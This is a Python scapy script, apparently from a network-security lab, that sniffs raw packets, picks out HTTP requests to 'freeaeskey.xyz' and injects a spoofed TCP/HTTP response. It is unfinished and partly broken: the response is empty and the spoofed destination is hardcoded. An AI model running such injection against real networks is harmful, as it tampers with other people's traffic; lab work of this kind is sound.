#!/usr/bin/python3

import scapy
from scapy.layers.http import HTTPResponse, HTTPRequest
import scapy.packet as packet
import urllib.parse as parse
from scapy.all import *
from scapy.utils import *

def inject_pkt(pkt):
    #import dnet
    #dnet.ip().send(pkt)
    from scapy.all import send, conf, L3RawSocket
    conf.L3socket=L3RawSocket
    send(pkt)

######
# edit this function to do your attack
######
def handle_pkt(pkt):
    # The strategy is to try to make everything an HTTP request, and any packets
    # that are not will be ignored.
    http_packet = None
    try:
        http_packet = HTTPRequest(pkt)
    except:
        return # Not an HTTP request. Ignore the packet.

    if http_packet.Host != None:
        host = http_packet.Host.decode('iso-8859-1')

        if host != 'freeaeskey.xyz':
            return

        ether = Ether(pkt)
        ip_layer = ether[IP]
        tcp_layer = ether[TCP]

        source = ip_layer.src
        destination = ip_layer.dst
        time_to_live = ip_layer.ttl

        print("Source: {}, Destination: {}, Time: {}".format(source, destination, time_to_live))

        sequence_number = tcp_layer.seq
        acknowledgement = tcp_layer.ack
        source_port = tcp_layer.sport
        dest_port = tcp_layer.dport
        flags = tcp_layer.flags

        print("Sequence Number: {}, Ack number: {}, Source port: {}, Destination port: {}".format(sequence_number, acknowledgement, source_port, dest_port))

        spoof_http_layer = HTTPResponse()
        
        spoof_ack = sequence_number + len(spoof_http_layer)
        spoof_ip_layer = IP(dst="1.2.3.4", src=destination, ttl=time_to_live)
        spoof_tpc_layer = TCP(seq=acknowledgement, sport=dest_port, dport=source_port, ack=spoof_ack, flags=flags)

        print("Content Length: {}".format(len(http_packet)))

        # LEft off where we don't really know how to get wireshark to recognise the 
        # http response as an http protocol

        packet = spoof_ip_layer/spoof_tpc_layer/spoof_http_layer
        print(packet.show())

        inject_pkt(packet)

def main():
    import socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__ == '__main__':
    main()
